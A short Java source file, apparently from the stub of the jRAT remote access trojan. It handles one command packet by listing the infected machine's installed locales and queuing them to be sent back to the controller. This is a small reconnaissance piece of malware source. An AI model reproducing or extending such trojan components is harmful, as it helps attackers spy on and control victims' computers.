package pro.jrat.stub.packets.incoming;

import java.util.Locale;

import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet11InstalledLocales;

public class Packet97Locales extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Locale[] installed = Locale.getAvailableLocales();

		Connection.addToSendQueue(new Packet11InstalledLocales(installed));
	}

}
